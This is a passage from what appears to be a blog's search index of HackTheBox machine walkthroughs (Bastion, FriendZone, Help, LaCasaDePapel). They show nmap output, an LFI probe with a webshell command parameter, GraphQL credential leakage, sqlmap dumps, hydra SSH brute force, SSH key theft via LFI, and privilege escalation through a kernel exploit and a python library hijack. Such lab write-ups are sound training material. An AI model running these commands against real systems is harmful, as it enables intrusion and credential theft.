23:58:45 1600 lsass fr--r--r-- 3 Sun Dec 31 23:58:45 1600 ntsvcs fr--r--r-- 3 Sun Dec 31 23:58:45 1600 scerpc fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-2fc-0 fr--r--r-- 3 Sun Dec 31 23:58:45 1600 epmapper fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-1e8-0 fr--r--r-- 3 Sun Dec 31 23:58:45 1600 LSM_API_service fr--r--r-- 3 Sun Dec 31 23:58:45 1600 eventlog fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-3b8-0 fr--r--r-- 3 Sun Dec 31 23:58:45 1600 atsvc fr--r--r-- 4 Sun Dec 31 23:58:45 1600 wkssvc fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-364-0 fr--r--r-- 3 Sun Dec 31 23:58:45 1600 trkwks fr--r--r-- 3 Sun Dec 31 23:58:45 1600 spoolss fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-66c-0 fr--r--r-- 3 Sun Dec 31 23:58:45 1600 W32TIME_ALT fr--r--r-- 1 Sun Dec 31 23:58:45 1600 openssh-ssh-agent fr--r--r-- 4 Sun Dec 31 23:58:45 1600 srvsvc fr--r--r-- 1 Sun Dec 31 23:58:45 1600 vgauth-service fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-5ec-0 fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-264-0 fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-26c-0 Foothold Let\u0026rsquo;s check the note.txt We see 2 vhd files, let\u0026rsquo;s check them apt install guestmount - so we can mount vhd mount -t cifs //10.10.10.134/backups /mnt -o user=,password= guestmount --add /mnt/smb/WindowsImageBackup/L4mpje-PC/Backup\\ 2019-02-22\\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/disk Go to Windows/System32/config and dump the hashes Crack the hashes Connect to ssh Root Let\u0026rsquo;s enumerate Let\u0026rsquo;s check installed software We see mRemoteNG Let\u0026rsquo;s find it\u0026rsquo;s config file: confCons.xml According to docs it should be located in %AppData%\\mRemoteNG Let\u0026rsquo;s open it Decypher the password using mRemoteNG Decrypt And connect via ssh ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/bastion/images/bastion.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/bastion/","summary":"Bastion Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.134 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 21:20 BST Nmap scan report for 10.10.10.134 (10.10.10.134) Host is up (0.13s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a56ae753c780ec8564dcb1c22bf458a (RSA) | 256 cc2e56ab1997d5bb03fb82cd63da6801 (ECDSA) |_ 256 935f5daaca9f53e7f282e664a8a3a018 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-06-17T20:20:50 |_ start_date: 2023-06-17T18:27:22 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: -40m29s, deviation: 1h09m15s, median: -30s | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.","tags":["HTB","smbmap","smbclient","smb","vhd","mount","guestmount","secretsdump","crackstation","ssh","mremoteng"],"title":"[HTB] Machine: Bastion"},{"categories":null,"contents":"FriendZone Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.123 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-18 15:55 BST Nmap scan report for 10.10.10.123 (10.10.10.123) Host is up (0.13s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a96824bc971f1e54a58045e74cd9aaa0 (RSA) | 256 e5440146ee7abb7ce91acb14999e2b8e (ECDSA) |_ 256 004e1a4f33e8a0de86a6e42a5f84612b (ED25519) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Friend Zone Escape software 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.4.29 | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO | Not valid before: 2018-10-05T21:02:30 |_Not valid after: 2018-11-04T21:02:30 |_http-server-header: Apache/2.4.29 (Ubuntu) |_ssl-date: TLS randomness does not represent time |_http-title: 404 Not Found 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: -1h00m29s, deviation: 1h43m54s, median: -30s | smb2-time: | date: 2023-06-18T14:55:52 |_ start_date: N/A | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 000000000000 (Xerox) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: friendzone | NetBIOS computer name: FRIENDZONE\\x00 | Domain name: \\x00 | FQDN: friendzone |_ System time: 2023-06-18T17:55:53+03:00 | smb2-security-mode: | 311: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 40.94 seconds smbmap └─$ smbmap -H 10.10.10.123 -R [+] Guest session IP: 10.10.10.123:445 Name: 10.10.10.123 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers Files NO ACCESS FriendZone Samba Server Files /etc/Files general READ ONLY FriendZone Samba Server Files .\\general\\* dr--r--r-- 0 Wed Jan 16 20:10:51 2019 . dr--r--r-- 0 Tue Sep 13 15:56:24 2022 .. fr--r--r-- 57 Wed Oct 10 00:52:42 2018 creds.txt Development READ, WRITE FriendZone Samba Server Files .\\Development\\* dr--r--r-- 0 Sun Jun 18 16:10:05 2023 . dr--r--r-- 0 Tue Sep 13 15:56:24 2022 .. IPC$ NO ACCESS IPC Service (FriendZone server (Samba, Ubuntu)) Creds Web server gobuster dig axfr Foothold https://administrator1.friendzone.red/ Use the creds from smb Let\u0026rsquo;s test params It seems like image_id provides nothing Let\u0026rsquo;s try pagename It seems like it appends .php to parameter Let\u0026rsquo;s get source code Used CyberChef for decoding We can have a LFI We had a read, write permissions on Development share Maybe we can put our web-shell, but we have to find the location of the Development folder Let\u0026rsquo;s upload a web-shell and search for it Let\u0026rsquo;s generate wordlist for root directories And use it for fuzzing wfuzz -c -w ./root_dirs -H 'Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' 'https://administrator1.friendzone.red/dashboard.php?image_id=\u0026amp;pagename=../../..FUZZ/Development/shell\u0026amp;cmd=id' And we find the location, which is /etc Let\u0026rsquo;s check Time to get our reverse-shell User Upload and run linpeas Let\u0026rsquo;s check mysql_data.conf Try su - friend in case of cred reuse Root Let\u0026rsquo;s check /opt/server_admin We see that this job is automated We see a writable module os.py, which is included in the script above We can hijack it according to this post Check the python path order We see the first line is blank, which is according to the post is the Directory of the script being executed We can try creating os.py there or simply add payload to existing os.py since we can write to it Let\u0026rsquo;s simply add payload to existing file Set up listener and for connection ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/friendzone/images/friendzone.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/friendzone/","summary":"FriendZone Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.123 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-18 15:55 BST Nmap scan report for 10.10.10.123 (10.10.10.123) Host is up (0.13s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a96824bc971f1e54a58045e74cd9aaa0 (RSA) | 256 e5440146ee7abb7ce91acb14999e2b8e (ECDSA) |_ 256 004e1a4f33e8a0de86a6e42a5f84612b (ED25519) 53/tcp open domain ISC BIND 9.","tags":["HTB","smbmap","smbclient","zone-transfer","dns","dig","lfi","php","ssh","pspy","python-library-hijack"],"title":"[HTB] Machine: FriendZone"},{"categories":null,"contents":"Help Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.121 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 18:37 BST Nmap scan report for 10.10.10.121 (10.10.10.121) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e5bb4d9cdeaf6bbfba8c227ad8d74328 (RSA) | 256 d5b010507486a39fc5536f3b4a246119 (ECDSA) |_ 256 e21b88d37621d41e38154a8111b79907 (ED25519) 80/tcp open http Apache httpd 2.4.18 |_http-title: Did not follow redirect to http://help.htb/ |_http-server-header: Apache/2.4.18 (Ubuntu) 3000/tcp open http Node.js Express framework |_http-title: Site doesn\u0026#39;t have a title (application/json; charset=utf-8). Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.49 seconds gobuster └─$ gobuster dir -u http://help.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,html,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://help.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: html,txt,php [+] Timeout: 10s =============================================================== 2023/06/20 17:43:00 Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 287] /.html (Status: 403) [Size: 288] /index.html (Status: 200) [Size: 11321] /support (Status: 301) [Size: 306] [--\u0026gt; http://help.htb/support/] /javascript (Status: 301) [Size: 309] [--\u0026gt; http://help.htb/javascript/] Web server Port 3000 If we check the response headers It\u0026rsquo;s says powered by Express If we google about Express and it\u0026rsquo;s query language we see GraphQL Foothold Let\u0026rsquo;s enumerate GraphQL Docs Query all information regarding types We see that we have user query User type with username and password fields └─$ curl -s 10.10.10.121:3000/graphql -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{ \u0026#34;query\u0026#34;: \u0026#34;{ __schema { types { name, fields { name, description } } } }\u0026#34; }\u0026#39; | jq { \u0026#34;data\u0026#34;: { \u0026#34;__schema\u0026#34;: { \u0026#34;types\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Query\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34; } ] }, { \u0026#34;name\u0026#34;: \u0026#34;User\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;username\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;password\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34; } ] }, { \u0026#34;name\u0026#34;: \u0026#34;String\u0026#34;, \u0026#34;fields\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;__Schema\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;types\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;A list of all types supported by this server.\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;queryType\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;The type that query operations will be rooted at.\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;mutationType\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;If this server supports mutation, the type that mutation operations will be rooted at.\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;subscriptionType\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;If this server support subscription, the type that subscription operations will be rooted at.\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;directives\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;A list of all directives supported by this server.\u0026#34; } ] }, { \u0026#34;name\u0026#34;: \u0026#34;__Type\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;kind\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;description\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;fields\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;interfaces\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;possibleTypes\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;enumValues\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;inputFields\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;ofType\u0026#34;, \u0026#34;description\u0026#34;: null } ] }, { \u0026#34;name\u0026#34;: \u0026#34;__TypeKind\u0026#34;, \u0026#34;fields\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;Boolean\u0026#34;, \u0026#34;fields\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;__Field\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;description\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;args\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;type\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;isDeprecated\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;deprecationReason\u0026#34;, \u0026#34;description\u0026#34;: null } ] }, { \u0026#34;name\u0026#34;: \u0026#34;__InputValue\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;description\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;type\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;defaultValue\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;A GraphQL-formatted string representing the default value for this input value.\u0026#34; } ] }, { \u0026#34;name\u0026#34;: \u0026#34;__EnumValue\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;description\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;isDeprecated\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;deprecationReason\u0026#34;, \u0026#34;description\u0026#34;: null } ] }, { \u0026#34;name\u0026#34;: \u0026#34;__Directive\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;description\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;locations\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;args\u0026#34;, \u0026#34;description\u0026#34;: null } ] }, { \u0026#34;name\u0026#34;: \u0026#34;__DirectiveLocation\u0026#34;, \u0026#34;fields\u0026#34;: null } ] } } } user query returns User type └─$ curl -s 10.10.10.121:3000/graphql -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{ \u0026#34;query\u0026#34;: \u0026#34;{ __schema { queryType { name, fields { name, description, args {name}, type {name} } } } }\u0026#34; }\u0026#39; | jq { \u0026#34;data\u0026#34;: { \u0026#34;__schema\u0026#34;: { \u0026#34;queryType\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;Query\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;args\u0026#34;: [], \u0026#34;type\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;User\u0026#34; } } ] } } } } Let\u0026rsquo;s query └─$ curl -s 10.10.10.121:3000/graphql -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{ \u0026#34;query\u0026#34;: \u0026#34;{ user { username password } }\u0026#34; }\u0026#39; | jq { \u0026#34;data\u0026#34;: { \u0026#34;user\u0026#34;: { \u0026#34;username\u0026#34;: \u0026#34;helpme@helpme.com\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;5d3c93182bb20f07b994a7f617e99cff\u0026#34; } } } Crack the hash Let\u0026rsquo;s find a place where we can use those credentials We saw support endpoint in gobuster results let\u0026rsquo;s open it Use the creds It\u0026rsquo;s a HelpDeskZ Let\u0026rsquo;s find the version We have 2 possible exploits related to version \u0026lt;= 1.0.2 The older version of HelpDeskZ have a readme.html file Github Let\u0026rsquo;s check SQL Injection We have to follow the steps specified in the exploit Create a ticket Open a ticket and check the attachment link In my case: http://help.htb/support/?v=view_tickets\u0026amp;action=ticket\u0026amp;param[]=4\u0026amp;param[]=attachment\u0026amp;param[]=1\u0026amp;param[]=6 Open Burp Suite and click the attachment link Copy to file the request Let\u0026rsquo;s launch sqlmap sqlmap -r help.req --level 5 --risk 3 -p param[] --dump or you can dump specific table: sqlmap -r help.req --level 5 --risk 3 -p param[] --dump -D support -T staff And we get the results We have our password, let\u0026rsquo;s try with different usernames We can use hydra hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p 'Welcome1' ssh://10.10.10.121 Root Let\u0026rsquo;s enumerate for privesc The kernel version is 4.4.-116-generic Exploit Download and compile it Upload to server and run First, I compiled it on my own machine and uploaded, but it didn\u0026rsquo;t work since the versions of glibc were different Then, I simply uploaded the source code, knowing I had gcc on the box, compiled it and ran it ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/help/images/help.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/help/","summary":"Help Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.121 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 18:37 BST Nmap scan report for 10.10.10.121 (10.10.10.121) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e5bb4d9cdeaf6bbfba8c227ad8d74328 (RSA) | 256 d5b010507486a39fc5536f3b4a246119 (ECDSA) |_ 256 e21b88d37621d41e38154a8111b79907 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","graphql","crackstation","helpdeskz","searchsploit","exploit-db","sqli","blindsqli","sqlmap","ssh","filter","php","webshell","cve-2017-16995","cve-2017-5899"],"title":"[HTB] Machine: Help"},{"categories":null,"contents":"LaCasaDePapel Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.131 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 16:13 BST Nmap scan report for 10.10.10.131 (10.10.10.131) Host is up (0.19s latency). Not shown: 982 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 7.9 (protocol 2.0) | ssh-hostkey: | 2048 03e1c2c9791ca66b51348d7ac3c7c850 (RSA) | 256 41e495a3390b25f9dadebe6adc59486d (ECDSA) |_ 256 300bc6662b8f5e4f2628750ef5b171e4 (ED25519) 80/tcp open http Node.js (Express middleware) |_http-title: La Casa De Papel 119/tcp filtered nntp 443/tcp open ssl/http Node.js Express framework |_http-title: La Casa De Papel | tls-nextprotoneg: | http/1.1 |_ http/1.0 | ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel | Not valid before: 2019-01-27T08:35:30 |_Not valid after: 2029-01-24T08:35:30 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Server returned status 401 but no WWW-Authenticate header. 1065/tcp filtered syscomlan 1084/tcp filtered ansoft-lm-2 1112/tcp filtered msql 1914/tcp filtered elm-momentum 2034/tcp filtered scoremgr 2119/tcp filtered gsigatekeeper 4444/tcp filtered krb524 7000/tcp filtered afs3-fileserver 15660/tcp filtered bex-xr 19350/tcp filtered unknown 20031/tcp filtered unknown 34571/tcp filtered unknown 52869/tcp filtered unknown Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 80.58 seconds Web Server Foothold vsftpd 2.3.4 Exploit Let\u0026rsquo;s run it It\u0026rsquo;s a psy If we ran phpinfo(), we see that there is a list of disabled functions User I tried opening users\u0026rsquo; home directories and their .ssh folder, but had no success Found ca.key We can use openssl to check TLS configurations └─$ openssl s_client -connect 10.10.10.131:443 CONNECTED(00000003) Can\u0026#39;t use SSL_get_servername depth=0 CN = lacasadepapel.htb, O = La Casa De Papel verify error:num=18:self-signed certificate verify return:1 depth=0 CN = lacasadepapel.htb, O = La Casa De Papel verify return:1 --- Certificate chain 0 s:CN = lacasadepapel.htb, O = La Casa De Papel i:CN = lacasadepapel.htb, O = La Casa De Papel a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256 v:NotBefore: Jan 27 08:35:30 2019 GMT; NotAfter: Jan 24 08:35:30 2029 GMT --- Server certificate -----BEGIN CERTIFICATE----- MIIC6jCCAdICCQDISiE8M6B29jANBgkqhkiG9w0BAQsFADA3MRowGAYDVQQDDBFs YWNhc2FkZXBhcGVsLmh0YjEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDAeFw0x OTAxMjcwODM1MzBaFw0yOTAxMjQwODM1MzBaMDcxGjAYBgNVBAMMEWxhY2FzYWRl cGFwZWwuaHRiMRkwFwYDVQQKDBBMYSBDYXNhIERlIFBhcGVsMIIBIjANBgkqhkiG 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3M6VN7OD5sHW+zCbIv/5vJpuaxJF3A5q2rV QJNqU1sFsbnaPxRbFgAtc8hVeMNii2nCFO8PGGs9P9pvoy8e8DR9ksBQYyXqOZZ8 /rsdxwfjYVgv+a3UbJNO4e9Sd3b8GL+4XIzzSi3EZbl7dlsOhl4+KB4cM4hNhE5B 4K8UKe4wfKS/ekgyCRTRENVqqd3izZzz232yyzFvDGEOFJVzmhlHVypqsfS9rKUV ESPHczaEQld3kupVrt/mBqwuKe99sluQzORqO1xMqbNgb55ZD66vQBSkN2PwBeiR PBRNXfnWla3Gkabukpu9xR9o+l7ut13PXdQ/fPflLDwnu5wMZwIDAQABMA0GCSqG SIb3DQEBCwUAA4IBAQCuo8yzORz4pby9tF1CK/4cZKDYcGT/wpa1v6lmD5CPuS+C hXXBjK0gPRAPhpF95DO7ilyJbfIc2xIRh1cgX6L0ui/SyxaKHgmEE8ewQea/eKu6 vmgh3JkChYqvVwk7HRWaSaFzOiWMKUU8mB/7L95+mNU7DVVUYB9vaPSqxqfX6ywx BoJEm7yf7QlJTH3FSzfew1pgMyPxx0cAb5ctjQTLbUj1rcE9PgcSki/j9WyJltkI EqSngyuJEu3qYGoM0O5gtX13jszgJP+dA3vZ1wqFjKlWs2l89pb/hwRR2raqDwli MgnURkjwvR1kalXCvx9cST6nCkxF2TxlmRpyNXy4 -----END CERTIFICATE----- subject=CN = lacasadepapel.htb, O = La Casa De Papel issuer=CN = lacasadepapel.htb, O = La Casa De Papel --- Acceptable client certificate CA names CN = lacasadepapel.htb, O = La Casa De Papel Client Certificate Types: RSA sign, DSA sign, ECDSA sign Requested Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224:RSA+SHA1:DSA+SHA1:ECDSA+SHA1 Shared Requested Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224:RSA+SHA1:DSA+SHA1:ECDSA+SHA1 Peer signing digest: SHA512 Peer signature type: RSA Server Temp Key: ECDH, prime256v1, 256 bits --- SSL handshake has read 1537 bytes and written 561 bytes Verification error: self-signed certificate --- New, TLSv1.2, Cipher is ECDHE-RSA-AES128-GCM-SHA256 Server public key is 2048 bit Secure Renegotiation IS supported Compression: NONE Expansion: NONE No ALPN negotiated SSL-Session: Protocol : TLSv1.2 Cipher : ECDHE-RSA-AES128-GCM-SHA256 Session-ID: CB1545984AC48ABA22DD66B3232679DE2FD4EE27366D7CA1F7C0CD415F2721D7 Session-ID-ctx: Master-Key: C377D9A9FF84789464AC768D8EA03AA3EB6AB15CA746294C683E050C4AB21C3F679953885BF25CEB256E03BC59B97EE4 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 300 (seconds) TLS session ticket: 0000 - fa 80 99 68 e5 6a 75 04-a9 f0 4d bc 3f 88 98 bf ...h.ju...M.?... 0010 - 78 59 49 13 72 6a c4 d7-39 ad b3 0c da bc 5c c2 xYI.rj..9.....\\. 0020 - ce f9 39 99 eb 05 0d dc-cf 79 87 60 6b 98 98 67 ..9......y.`k..g 0030 - 7e 6d b3 ba 60 8a af 32-cc 6b cd 69 a1 be 4c 42 ~m..`..2.k.i..LB 0040 - 95 1f a6 2b 31 03 84 6c-7b 60 71 a6 c9 2d 17 e0 ...+1..l{`q..-.. 0050 - 67 21 af 52 27 47 3d 07-f0 d8 67 b1 76 c5 86 86 g!.R\u0026#39;G=...g.v... 0060 - 9f dd 35 aa 49 5b c2 e3-6e 42 20 33 a4 04 1f 4e ..5.I[..nB 3...N 0070 - cf 0a 29 3c 26 71 8d bd-42 f2 e4 d7 d1 83 54 2f ..)\u0026lt;\u0026amp;q..B.....T/ 0080 - a0 3a fa 1a ef 46 9b 38-38 69 d5 5d 60 0f 9f fa .:...F.88i.]`... 0090 - 6e 1f a0 57 14 97 eb 3b-b7 42 e4 d1 42 f0 97 77 n..W...;.B..B..w 00a0 - 75 09 22 d0 46 3a 1f 17-b4 86 63 c5 03 21 44 37 u.\u0026#34;.F:....c..!D7 00b0 - 98 de c1 f0 f8 7d fb b6-62 66 b5 d5 08 16 aa 40 .....}..bf.....@ Start Time: 1687192547 Timeout : 7200 (sec) Verify return code: 18 (self-signed certificate) Extended master secret: no --- Let\u0026rsquo;s generate pkcs12 certificate using ca\u0026rsquo;s key and certificate Import it to firefox Refresh the page and turn off Burp Suite Press Ok When opening SEASON-1 it redirects to https://10.10.10.131/?path=SEASON-1 Download any file Let\u0026rsquo;s grab ssh keys from all users, since we have lfi I only was able to download berlin\u0026rsquo;s id_rsa Let\u0026rsquo;s use to connect as any user Found a nice way to try each user from 0xdf: for user in berlin dali nairobi oslo professor; do ssh -oBatchMode=yes -i ~/id_rsa_lacasadepapel_berlin $user@10.10.10.131; done I had an issue with format of the key, so I downloaded it using curl: curl -k https://10.10.10.131/file/Li4vLnNzaC9pZF9yc2E= Don\u0026rsquo;t forget to set permissions to 600 Root We have a memcached.ini We see there is a process running as nobody Running pspy will tell you that there is a automated job running every few minutes So we can try changing the command, but we can\u0026rsquo;t since it\u0026rsquo;s owned by root But we can delete it and create a new one, since the directory is owned by professor Let\u0026rsquo;s delete and create a file And we have our root 